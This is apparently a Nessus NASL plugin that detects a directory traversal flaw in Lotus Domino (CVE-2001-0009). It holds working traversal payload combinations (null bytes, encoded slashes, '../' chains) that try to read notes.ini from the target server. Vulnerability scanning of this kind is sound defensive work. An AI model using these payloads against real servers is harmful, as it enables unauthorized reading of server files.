#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(11344);
 script_version ("$Revision: 1.3 $");
 script_cve_id("CVE-2001-0009");
 script_bugtraq_id(2173);
 
 name["english"] = "Domino traversal";
 name["francais"] = "Domino traversal";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It is possible to read arbitrary files on
the remote server by prepending %00%00.nsf/../
in front of it.


Solution : Upgrade to a newer version
Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "\..\..\file.txt";
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2003 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl", "httpver.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("www/domino");
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");

port = get_kb_item("Services/www");
if(!port)port = 80;
if(! get_port_state(port)) exit(0);

banner = get_http_banner(port);
if(egrep(pattern:"Lotus-Domino/5\.0\.[0-6]", string:banner))
{
	security_hole(port);
	exit (0);
}


# Test for the flaw anyway

exts = make_list(".nsf", ".box", ".nt4");
vars = make_list("%00", "%00%00", "%20", "%C0%AF", "%c0%af%00", "%20%00", "/..");
ups  = make_list("/../../../../../", 
		"//../../../../../");



foreach ext (exts)
 foreach var (vars)
  foreach up (ups)
{
  url = string(var, ext, up, "lotus/domino/notes.ini");
  r = http_keepalive_send_recv(port:port, data:http_get(item:url, port:port));
  if( r == NULL )
  	exit(0);
  r = tolower(r);
  if(("httphost" >< r) 		 || ("resultsdirectory" >< r)  ||
     ("numaddlocalreplica" >< r) || ("normalmessagesize" >< r) ||
     ("sharednotes" >< r)	 || ("[notes]" >< r)	       ||
     ("notesprogram" >< r)){
     	security_hole(port);
	exit(0);
	}
}
